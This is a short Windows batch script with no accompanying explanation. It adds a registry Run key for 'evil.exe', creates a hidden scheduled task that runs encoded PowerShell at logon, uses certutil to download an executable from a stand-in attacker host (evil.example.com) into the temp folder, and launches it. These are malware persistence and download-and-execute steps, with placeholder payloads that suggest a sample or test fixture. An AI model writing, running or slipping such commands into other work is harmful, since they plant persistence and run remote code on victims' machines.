@echo off
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v up /d "evil.exe" /f
schtasks /create /tn "upd" /tr "powershell -w hidden -enc AAA" /sc onlogon
certutil -urlcache -split -f http://evil.example.com/a.exe %TEMP%\a.exe
start %TEMP%\a.exe
